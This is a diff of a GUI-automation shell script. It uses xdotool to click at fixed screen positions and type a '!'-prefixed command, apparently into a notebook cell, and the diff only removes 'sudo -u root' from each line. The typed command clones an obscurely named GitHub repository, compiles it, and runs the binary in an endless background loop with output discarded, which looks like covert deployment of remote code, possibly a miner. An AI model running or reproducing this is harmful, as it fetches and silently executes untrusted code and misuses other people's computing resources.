@@ -1,36 +1,36 @@
-sudo -u root xdotool mousemove 111 137 click 1
+xdotool mousemove 111 137 click 1
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 227 480 click 1
+xdotool mousemove 227 480 click 1
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 727 474 click 1
+xdotool mousemove 727 474 click 1
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 708 511 click 1
+xdotool mousemove 708 511 click 1
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 944 607 click 1
+xdotool mousemove 944 607 click 1
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 234 234 click 1
+xdotool mousemove 234 234 click 1
 
 sleep 0.4
 
-sudo -u root xdotool type '!echo -e "git clone https://github.com/mobileapps84741274/linux8444;cd ./linux8444;mkdir ./build/;cd ./build/;cmake ..;make;\nwhile true\ndo\n./linux84444474 g\ndone" > "./linux8474";bash ./linux8474 &> /dev/null &'
+xdotool type '!echo -e "git clone https://github.com/mobileapps84741274/linux8444;cd ./linux8444;mkdir ./build/;cd ./build/;cmake ..;make;\nwhile true\ndo\n./linux84444474 g\ndone" > "./linux8474";bash ./linux8474 &> /dev/null &'
 
 sleep 0.4
 
-sudo -u root xdotool mousemove 74 234 click 1
+xdotool mousemove 74 234 click 1
 
 sleep 4
 
-sudo -u root xdotool mousemove 1514 44 click 1
+xdotool mousemove 1514 44 click 1
 
 sleep 0.4
 
